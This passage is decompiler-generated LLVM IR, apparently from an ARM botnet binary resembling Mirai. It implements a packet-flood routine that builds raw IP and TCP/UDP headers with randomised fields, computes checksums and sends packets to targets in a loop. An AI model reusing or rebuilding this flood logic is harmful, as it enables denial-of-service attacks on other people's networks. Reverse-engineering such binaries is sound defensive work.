  %v1_9744 = trunc i32 %v0_9744 to i8
  %v2_9744 = load i32, i32* @r5, align 4
  %v3_9744 = add i32 %v2_9744, 8
  %v4_9744 = inttoptr i32 %v3_9744 to i8*
  store i8 %v1_9744, i8* %v4_9744, align 1
  %v0_9748 = load i32, i32* %r3.global-to-local, align 4
  %v1_9748 = trunc i32 %v0_9748 to i8
  %v2_9748 = load i32, i32* @r5, align 4
  %v3_9748 = add i32 %v2_9748, 9
  %v4_9748 = inttoptr i32 %v3_9748 to i8*
  store i8 %v1_9748, i8* %v4_9748, align 1
  %v0_974c = call i32 @rand_next()
  store i32 %v0_974c, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* %r1.global-to-local, align 4
  store i1 %v2_9758, i1* %cpsr_z.global-to-local, align 1
  %v1_975c = sub i32 1023, %v0_974c
  store i32 %v1_975c, i32* %r3.global-to-local, align 4
  br i1 %v2_9758, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9764 = load i32, i32* @r5, align 4
  %v3_9764 = add i32 %v2_9764, 16
  %v4_9764 = inttoptr i32 %v3_9764 to i32*
  store i32 %v1_975c, i32* %v4_9764, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9760 = load i32, i32* %r4.global-to-local, align 4
  %v2_9760 = add i32 %v1_9760, 16
  %v3_9760 = inttoptr i32 %v2_9760 to i32*
  %v4_9760 = load i32, i32* %v3_9760, align 4
  store i32 %v4_9760, i32* %r3.global-to-local, align 4
  %v2_9768 = load i32, i32* @r5, align 4
  %v3_9768 = add i32 %v2_9768, 16
  %v4_9768 = inttoptr i32 %v3_9768 to i32*
  store i32 %v4_9760, i32* %v4_9768, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_976c = load i32, i32* @r5, align 4
  %v2_976c = add i32 %v1_976c, 12
  %v3_976c = inttoptr i32 %v2_976c to i32*
  store i32 %v0_974c, i32* %v3_976c, align 4
  %v3_9770 = load i32, i32* %stack_var_-44, align 4
  %v0_9774 = load i32, i32* %r4.global-to-local, align 4
  %v1_9774 = add i32 %v0_9774, 58
  store i32 %v1_9774, i32* @r6, align 4
  store i32 %v4_9778, i32* %r2.global-to-local, align 4
  %v1_977c = add i32 %v3_9770, 1
  store i32 %v1_977c, i32* @r4, align 4
  store i32 %v4_9780, i32* %r3.global-to-local, align 4
  %v1_9784 = load i32, i32* @sl, align 4
  %v9_9784 = icmp eq i32 %v1_977c, %v1_9784
  store i1 %v9_9784, i1* %cpsr_z.global-to-local, align 1
  %v0_9788 = load i32, i32* @r7, align 4
  %v1_9788 = trunc i32 %v0_9788 to i16
  %v3_9788 = add i32 %v0_9774, 62
  %v4_9788 = inttoptr i32 %v3_9788 to i16*
  store i16 %v1_9788, i16* %v4_9788, align 2
  %v0_978c = load i32, i32* %r2.global-to-local, align 4
  %v1_978c = trunc i32 %v0_978c to i16
  %v2_978c = load i32, i32* @r6, align 4
  %v3_978c = inttoptr i32 %v2_978c to i16*
  store i16 %v1_978c, i16* %v3_978c, align 2
  %v0_9790 = load i32, i32* %r3.global-to-local, align 4
  %v1_9790 = trunc i32 %v0_9790 to i16
  %v2_9790 = load i32, i32* @r6, align 4
  %v3_9790 = add i32 %v2_9790, 2
  %v4_9790 = inttoptr i32 %v3_9790 to i16*
  store i16 %v1_9790, i16* %v4_9790, align 2
  %v0_9794 = load i32, i32* @r4, align 4
  store i32 %v0_9794, i32* %stack_var_-44, align 4
  %v5_9798 = icmp slt i32 %v1_977c, %v1_9784
  br i1 %v5_9798, label %dec_label_pc_9640, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %bb85
  %v1_97a4 = add i32 %v5_94c0, 8
  store i32 %v1_97a4, i32* %r4.global-to-local, align 4
  %v1_97a8 = add i32 %v5_94c0, 66
  store i32 %v1_97a8, i32* %r5.global-to-local, align 4
  %v0_97b8.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_97b4.preheader

dec_label_pc_97b4.preheader:                      ; preds = %dec_label_pc_979c, %dec_label_pc_9a4c
  %v0_97b8.pre = phi i32 [ %v0_97b8.pre.pre, %dec_label_pc_979c ], [ 0, %dec_label_pc_9a4c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_97a8, %dec_label_pc_979c ], [ %v1_9a58, %dec_label_pc_9a4c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_97a4, %dec_label_pc_979c ], [ %v1_9a54, %dec_label_pc_9a4c ]
  %v2_9a08 = icmp eq i32 %v1_956c, 0
  %v2_9850 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9878 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9884 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9898 = icmp eq i32 %v1_94e0, 0
  %v2_97f8 = icmp eq i32 %v5_9514, -1
  %v7_97f8 = icmp eq i32 %v5_9514, -1
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_97b4, %dec_label_pc_98a0, %dec_label_pc_97b4.preheader
  %v0_97b8 = phi i32 [ %v0_97b8.pre, %dec_label_pc_97b4.preheader ], [ 0, %dec_label_pc_97b4 ], [ %v1_993c, %dec_label_pc_98a0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_97b8 = icmp eq i32 %v0_97b8, 0
  store i1 %v2_97b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97b8, label %dec_label_pc_97b4, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_97c4
  %v1_97dc = phi i32 [ %v1_9938, %dec_label_pc_98a0 ], [ 0, %dec_label_pc_97c4 ]
  %v5_97cc = mul i32 %v1_97dc, 24
  %v1_97d0 = load i32, i32* @sb, align 4
  %v2_97d0 = add i32 %v1_97d0, %v5_97cc
  store i32 %v2_97d0, i32* %r3.global-to-local, align 4
  store i32 %v2_93f4, i32* %r4.global-to-local, align 4
  %v1_97d8 = add i32 %v2_97d0, 20
  %v2_97d8 = inttoptr i32 %v1_97d8 to i8*
  %v3_97d8 = load i8, i8* %v2_97d8, align 1
  %v4_97d8 = zext i8 %v3_97d8 to i32
  store i32 %v4_97d8, i32* %r2.global-to-local, align 4
  %v4_97dc = mul i32 %v1_97dc, 4
  %v5_97dc = add i32 %v4_97dc, %v2_93f4
  %v6_97dc = inttoptr i32 %v5_97dc to i32*
  %v7_97dc = load i32, i32* %v6_97dc, align 4
  store i32 %v7_97dc, i32* @r5, align 4
  %v7_97e0 = icmp eq i8 %v3_97d8, 31
  store i1 %v7_97e0, i1* %cpsr_z.global-to-local, align 1
  %v1_97e4 = add i32 %v7_97dc, 24
  store i32 %v1_97e4, i32* @r7, align 4
  %v1_97e8 = add i32 %v7_97dc, 38
  store i32 %v1_97e8, i32* @r6, align 4
  %v1_97ec = add i32 %v7_97dc, 58
  store i32 %v1_97ec, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_97d8, 32
  br i1 %tmp90, label %dec_label_pc_994c, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97c8
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9808 = load i32, i32* @fp, align 4
  %v9_9808 = icmp eq i32 %v0_9808, 65535
  store i1 %v9_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9808, label %dec_label_pc_99c4, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_99ac.dec_label_pc_9810_crit_edge, %dec_label_pc_9800
  %v1_9814 = phi i32 [ %v1_9814.pre, %dec_label_pc_99ac.dec_label_pc_9810_crit_edge ], [ 65535, %dec_label_pc_9800 ]
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v9_9814 = icmp eq i32 %v3_9574, %v1_9814
  store i1 %v9_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9814, label %dec_label_pc_99ec, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_99c4.dec_label_pc_981c_crit_edge, %dec_label_pc_9810
  %v1_9820 = phi i32 [ %v1_9820.pre, %dec_label_pc_99c4.dec_label_pc_981c_crit_edge ], [ %v1_9814, %dec_label_pc_9810 ]
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v9_9820 = icmp eq i32 %v3_9578, %v1_9820
  store i1 %v9_9820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9820, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9828:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %dec_label_pc_9a1c, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_9828
  %v1_9830 = load i32, i32* @r5, align 4
  %v2_9830 = add i32 %v1_9830, 16
  %v3_9830 = inttoptr i32 %v2_9830 to i32*
  %v4_9830 = load i32, i32* %v3_9830, align 4
  store i32 %v4_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = load i32, i32* @r6, align 4
  %v3_9834 = add i32 %v2_9834, 16
  %v4_9834 = inttoptr i32 %v3_9834 to i32*
  store i32 %v4_9830, i32* %v4_9834, align 4
  br label %dec_label_pc_983c

dec_label_pc_983c:                                ; preds = %bb88, %.thread11, %dec_label_pc_9a1c
  %v0_983c = call i32 @rand_next()
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  store i32 %v0_983c, i32* %stack_var_-48, align 4
  %v0_9844 = call i32 @rand_next()
  store i32 %v0_9844, i32* %r0.global-to-local, align 4
  store i32 %v0_9844, i32* %stack_var_-52, align 4
  %v0_984c = call i32 @rand_next()
  store i32 %v2_9850, i32* %r1.global-to-local, align 4
  store i32 %v0_984c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_985c = load i32, i32* @r7, align 4
  store i32 %v0_985c, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @util_memcpy(i32 %v0_985c, i32 %v2_9850, i32 4)
  %v0_9864 = load i32, i32* @r7, align 4
  %v1_9864 = add i32 %v0_9864, 6
  store i32 %v1_9864, i32* %r0.global-to-local, align 4
  store i32 %v2_9868, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9870 = call i32 @util_memcpy(i32 %v1_9864, i32 %v2_9868, i32 4)
  %v0_9874 = load i32, i32* @r7, align 4
  %v1_9874 = add i32 %v0_9874, 4
  store i32 %v1_9874, i32* %r0.global-to-local, align 4
  store i32 %v2_9878, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9880 = call i32 @util_memcpy(i32 %v1_9874, i32 %v2_9878, i32 2)
  store i32 %v2_9884, i32* %r1.global-to-local, align 4
  %v0_9888 = load i32, i32* @r7, align 4
  %v1_9888 = add i32 %v0_9888, 10
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9890 = call i32 @util_memcpy(i32 %v1_9888, i32 %v2_9884, i32 2)
  store i32 %v3_9890, i32* %r0.global-to-local, align 4
  store i32 %v1_94e0, i32* %r1.global-to-local, align 4
  store i1 %v2_9898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9898, label %dec_label_pc_98a0, label %dec_label_pc_9a28

dec_label_pc_98a0:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9a28
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_98a4 = load i32, i32* @r5, align 4
  %v3_98a4 = add i32 %v2_98a4, 10
  %v4_98a4 = inttoptr i32 %v3_98a4 to i16*
  store i16 0, i16* %v4_98a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v2_98b0 = call i32 @checksum_generic(i32 %v0_98ac, i32 20)
  %v3_98b0 = trunc i32 %v2_98b0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r5, align 4
  %v4_98b8 = add i32 %v3_98b8, 10
  %v5_98b8 = inttoptr i32 %v4_98b8 to i16*
  store i16 %v3_98b0, i16* %v5_98b8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_98c0 = trunc i32 %v0_98c0 to i16
  %v2_98c0 = load i32, i32* @r6, align 4
  %v3_98c0 = add i32 %v2_98c0, 10
  %v4_98c0 = inttoptr i32 %v3_98c0 to i16*
  store i16 %v1_98c0, i16* %v4_98c0, align 2
  %v0_98c4 = load i32, i32* @r6, align 4
  store i32 %v0_98c4, i32* @r0, align 4
  %v2_98c8 = call i32 @checksum_generic(i32 %v0_98c4, i32 20)
  %v3_98c8 = trunc i32 %v2_98c8 to i16
  store i32 %v2_98c8, i32* %r0.global-to-local, align 4
  %v3_98cc = load i32, i32* @r6, align 4
  %v4_98cc = add i32 %v3_98cc, 10
  %v5_98cc = inttoptr i32 %v4_98cc to i16*
  store i16 %v3_98c8, i16* %v5_98cc, align 2
  store i32 0, i32* @r4, align 4
  %v0_98d4 = load i32, i32* @r8, align 4
  store i32 %v0_98d4, i32* @r1, align 4
  %v1_98d8 = add i32 %v0_98d4, 4
  %v2_98d8 = inttoptr i32 %v1_98d8 to i16*
  %v3_98d8 = load i16, i16* %v2_98d8, align 2
  %v4_98d8 = zext i16 %v3_98d8 to i32
  store i32 %v4_98d8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98e0 = add i32 %v0_98d4, 6
  %v4_98e0 = inttoptr i32 %v3_98e0 to i16*
  store i16 0, i16* %v4_98e0, align 2
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @checksum_tcpudp(i32 %v0_98e4, i32 %v0_98d4, i32 %v4_98d8, i32 %stack_var_-136.0.ph)
  %v5_98e8 = trunc i32 %v4_98e8 to i16
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v3_98ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ec, i32* %r2.global-to-local, align 4
  %v3_98f0 = mul i32 %v3_98ec, 32
  store i32 %v3_98f0, i32* %r3.global-to-local, align 4
  %v0_98f4 = load i32, i32* @r5, align 4
  %v1_98f4 = add i32 %v0_98f4, 16
  %v2_98f4 = inttoptr i32 %v1_98f4 to i32*
  %v3_98f4 = load i32, i32* %v2_98f4, align 4
  %v5_98f8 = mul i32 %v3_98ec, 24
  store i32 %v5_98f8, i32* %r3.global-to-local, align 4
  %v1_98fc = load i32, i32* @sb, align 4
  %v2_98fc = add i32 %v1_98fc, %v5_98f8
  store i32 %v2_98fc, i32* @lr, align 4
  %v2_9900 = add i32 %v2_98fc, 4
  %v3_9900 = inttoptr i32 %v2_9900 to i32*
  store i32 %v3_98f4, i32* %v3_9900, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9908 = load i32, i32* @r8, align 4
  %v4_9908 = add i32 %v3_9908, 6
  %v5_9908 = inttoptr i32 %v4_9908 to i16*
  store i16 %v5_98e8, i16* %v5_9908, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9910 = load i32, i32* %r1.global-to-local, align 4
  %v1_9910 = trunc i32 %v0_9910 to i16
  %v2_9910 = load i32, i32* %r3.global-to-local, align 4
  %v3_9910 = load i32, i32* @sb, align 4
  %v4_9910 = add i32 %v3_9910, %v2_9910
  %v5_9910 = inttoptr i32 %v4_9910 to i16*
  store i16 %v1_9910, i16* %v5_9910, align 2
  %v0_9914 = load i32, i32* @r4, align 4
  %v1_9914 = trunc i32 %v0_9914 to i16
  %v2_9914 = load i32, i32* @lr, align 4
  %v3_9914 = add i32 %v2_9914, 2
  %v4_9914 = inttoptr i32 %v3_9914 to i16*
  store i16 %v1_9914, i16* %v4_9914, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r5, align 4
  store i32 %v0_991c, i32* %r1.global-to-local, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_9928 = load i32, i32* @lr, align 4
  %v0_992c = load i32, i32* %ip.global-to-local, align 4
  %v6_9930 = call i32 @__libc_sendto(i32 %v3_9528, i32 %v0_991c, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_9928, i32 %v0_992c)
  %v3_9934 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9934, i32* %r3.global-to-local, align 4
  %v1_9938 = add i32 %v3_9934, 1
  store i32 %v1_9938, i32* %r0.global-to-local, align 4
  %v1_993c = load i32, i32* @sl, align 4
  %v9_993c = icmp eq i32 %v1_9938, %v1_993c
  store i1 %v9_993c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9938, i32* %stack_var_-44, align 4
  %v6_9944 = icmp slt i32 %v1_9938, %v1_993c
  br i1 %v6_9944, label %dec_label_pc_97c8, label %dec_label_pc_97b4

dec_label_pc_994c:                                ; preds = %dec_label_pc_97c8
  %v1_994c = add i32 %v2_97d0, 16
  %v2_994c = inttoptr i32 %v1_994c to i32*
  %v3_994c = load i32, i32* %v2_994c, align 4
  store i32 %v3_994c, i32* %r4.global-to-local, align 4
  %v0_9950 = call i32 @rand_next()
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v3_9954 = load i32, i32* %stack_var_-44, align 4
  %v5_995c = mul i32 %v3_9954, 24
  %v0_9960 = load i32, i32* %r4.global-to-local, align 4
  %v1_9960 = and i32 %v0_9960, 16711680
  store i32 %v1_9960, i32* %ip.global-to-local, align 4
  %v3_9964 = udiv i32 %v0_9960, 16777216
  %v4_9968 = udiv i32 %v1_9960, 256
  %v5_9968 = or i32 %v4_9968, %v3_9964
  store i32 %v5_9968, i32* %r2.global-to-local, align 4
  %v1_996c = load i32, i32* @sb, align 4
  %v2_996c = add i32 %v1_996c, %v5_995c
  store i32 %v2_996c, i32* %r1.global-to-local, align 4
  %v1_9970 = and i32 %v0_9960, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_9970, i32* %r3.global-to-local, align 4
  %v1_9974 = add i32 %v2_996c, 20
  %v2_9974 = inttoptr i32 %v1_9974 to i8*
  %v3_9974 = load i8, i8* %v2_9974, align 1
  %v4_9974 = zext i8 %v3_9974 to i32
  store i32 %v4_9974, i32* %ip.global-to-local, align 4
  %v4_9978 = mul i32 %v1_9970, 256
  %v4_997c = mul i32 %v0_9960, 16777216
  %v5_9978 = or i32 %v4_9978, %v4_997c
  %v5_997c = or i32 %v5_9978, %v5_9968
  %v7_9980 = lshr i32 %v0_9950, %v4_9974
  %v8_9980 = add i32 %v7_9980, %v5_997c
  store i32 %v8_9980, i32* %r2.global-to-local, align 4
  %v1_9984 = and i32 %v8_9980, 16711680
  store i32 %v1_9984, i32* %r0.global-to-local, align 4
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  %v5_999c = call i32 @llvm.bswap.i32(i32 %v8_9980)
  store i32 %v5_999c, i32* %r3.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  %v1_99a4 = load i32, i32* @r5, align 4
  %v2_99a4 = add i32 %v1_99a4, 16
  %v3_99a4 = inttoptr i32 %v2_99a4 to i32*
  store i32 %v5_999c, i32* %v3_99a4, align 4
  br i1 %v2_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  %v0_99ac = call i32 @rand_next()
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_99b8 = load i32, i32* @fp, align 4
  %v9_99b8 = icmp eq i32 %v0_99b8, 65535
  store i1 %v9_99b8, i1* %cpsr_z.global-to-local, align 1
  %v1_99bc = load i32, i32* @r5, align 4
  %v2_99bc = add i32 %v1_99bc, 12
  %v3_99bc = inttoptr i32 %v2_99bc to i32*
  store i32 %v0_99ac, i32* %v3_99bc, align 4
  br i1 %v9_99b8, label %dec_label_pc_99c4, label %dec_label_pc_99ac.dec_label_pc_9810_crit_edge

dec_label_pc_99ac.dec_label_pc_9810_crit_edge:    ; preds = %dec_label_pc_99ac
  %v1_9814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9810

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9800
  %v0_99c4 = call i32 @rand_next()
  %v3_99cc = urem i32 %v0_99c4, 65536
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v1_99d8 = sub nsw i32 999, %v3_99cc
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v1_99dc = load i32, i32* %r4.global-to-local, align 4
  %v9_99dc = icmp eq i32 %v3_9574, %v1_99dc
  store i1 %v9_99dc, i1* %cpsr_z.global-to-local, align 1
  %v1_99e0 = trunc i32 %v0_99c4 to i16
  %v2_99e0 = load i32, i32* @r5, align 4
  %v3_99e0 = add i32 %v2_99e0, 4
  %v4_99e0 = inttoptr i32 %v3_99e0 to i16*
  store i16 %v1_99e0, i16* %v4_99e0, align 2
  %v0_99e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99e4 = trunc i32 %v0_99e4 to i16
  %v2_99e4 = load i32, i32* @r6, align 4
  %v3_99e4 = add i32 %v2_99e4, 4
  %v4_99e4 = inttoptr i32 %v3_99e4 to i16*
  store i16 %v1_99e4, i16* %v4_99e4, align 2
  br i1 %v9_99dc, label %dec_label_pc_99ec, label %dec_label_pc_99c4.dec_label_pc_981c_crit_edge

dec_label_pc_99c4.dec_label_pc_981c_crit_edge:    ; preds = %dec_label_pc_99c4
  %v1_9820.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_981c

dec_label_pc_99ec:                                ; preds = %dec_label_pc_99c4, %dec_label_pc_9810
  %v0_99ec = call i32 @rand_next()
  %v1_99ec = trunc i32 %v0_99ec to i16
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v1_99f4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99f4 = icmp eq i32 %v3_9578, %v1_99f4
  store i1 %v9_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = load i32, i32* @r5, align 4
  %v4_99f8 = add i32 %v3_99f8, 58
  %v5_99f8 = inttoptr i32 %v4_99f8 to i16*
  store i16 %v1_99ec, i16* %v5_99f8, align 2
  br i1 %v9_99f4, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  %v0_9a00 = call i32 @rand_next()
  %v1_9a00 = trunc i32 %v0_9a00 to i16
  store i32 %v0_9a00, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_9a00
  %v3_9a1032 = load i32, i32* @r8, align 4
  %v4_9a1033 = add i32 %v3_9a1032, 2
  %v5_9a1034 = inttoptr i32 %v4_9a1033 to i16*
  store i16 %v1_9a00, i16* %v5_9a1034, align 2
  br label %dec_label_pc_9a1c

bb88:                                             ; preds = %dec_label_pc_9a00
  %v1_9a0c = load i32, i32* @r5, align 4
  %v2_9a0c = add i32 %v1_9a0c, 16
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  %v4_9a0c = load i32, i32* %v3_9a0c, align 4
  store i32 %v4_9a0c, i32* %r3.global-to-local, align 4
  %v3_9a10 = load i32, i32* @r8, align 4
  %v4_9a10 = add i32 %v3_9a10, 2
  %v5_9a10 = inttoptr i32 %v4_9a10 to i16*
  store i16 %v1_9a00, i16* %v5_9a10, align 2
  %v1_9a14 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a14 = load i32, i32* @r6, align 4
  %v3_9a14 = add i32 %v2_9a14, 16
  %v4_9a14 = inttoptr i32 %v3_9a14 to i32*
  store i32 %v1_9a14, i32* %v4_9a14, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a1c:                                ; preds = %.thread31, %dec_label_pc_9828
  %v0_9a1c = call i32 @rand_next()
  store i32 %v0_9a1c, i32* %r0.global-to-local, align 4
  %v1_9a20 = load i32, i32* @r6, align 4
  %v2_9a20 = add i32 %v1_9a20, 16
  %v3_9a20 = inttoptr i32 %v2_9a20 to i32*
  store i32 %v0_9a1c, i32* %v3_9a20, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_983c
  %v0_9a28 = load i32, i32* @r8, align 4
  %v1_9a28 = add i32 %v0_9a28, 8
  store i32 %v1_9a28, i32* %r0.global-to-local, align 4
  store i32 %v5_94c0, i32* %r1.global-to-local, align 4
  %v2_9a30 = inttoptr i32 %v1_9a28 to i16*
  %v3_9a30 = call i32 @rand_str(i16* %v2_9a30, i32 %v5_94c0)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98a0

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9538
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_9a3c = call i32 @__GI___libc_close(i32 %v3_9528)
  store i32 %v1_9a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a40

dec_label_pc_9a40:                                ; preds = %entry, %dec_label_pc_9a38
  %v1_9a48 = phi i32 [ %v3_9528, %entry ], [ %v1_9a3c, %dec_label_pc_9a38 ]
  store i32 %v3_93d8, i32* %r4.global-to-local, align 4
  store i32 %v6_93d8, i32* %r5.global-to-local, align 4
  store i32 %v24_93d8, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a48

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9560
  %v1_9a54 = add i32 %v5_94c0, 8
  store i32 %v1_9a54, i32* %r1.global-to-local, align 4
  %v1_9a58 = add i32 %v5_94c0, 66
  store i32 %v1_9a58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_97b4.preheader

; uselistorder directives
  uselistorder i32 %v1_9a58, { 1, 0 }
  uselistorder i32 %v1_9a54, { 1, 0 }
  uselistorder i16 %v1_9a00, { 1, 0 }
  uselistorder i32 %v0_9a00, { 1, 0 }
  uselistorder i32 %v0_99ec, { 1, 0 }
  uselistorder i32 %v3_99cc, { 1, 0 }
  uselistorder i32 %v0_99c4, { 1, 0 }
  uselistorder i32 %v5_999c, { 1, 0 }
  uselistorder i32 %v0_9960, { 0, 2, 1, 3 }
  uselistorder i32 %v1_993c, { 1, 2, 0 }
  uselistorder i32 %v1_9938, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ec, { 1, 0, 2 }
  uselistorder i32 %v4_98e8, { 1, 0 }
  uselistorder i32 %v0_98d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_98c8, { 1, 0 }
  uselistorder i32 %v7_97dc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97f8, { 2, 1, 0 }
  uselistorder i1 %v2_9a08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_974c, { 1, 0, 2 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v3_95ac, { 1, 2, 0 }
  uselistorder i32 %v1_95a8, { 1, 0 }
  uselistorder i32 %v1_956c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9564, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9560, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9558, { 1, 0 }
  uselistorder i1 %v7_952c, { 1, 0 }
  uselistorder i32 %v3_9528, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9514, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94e0, { 1, 2, 0 }
  uselistorder i32 %v5_94c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9474, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 1, 0 }
  uselistorder i32 %v5_9448, { 1, 0 }
  uselistorder i8 %v5_942c, { 0, 2, 1 }
  uselistorder i32 %v6_940c, { 1, 0 }
  uselistorder i32 %v2_93f4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 25, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
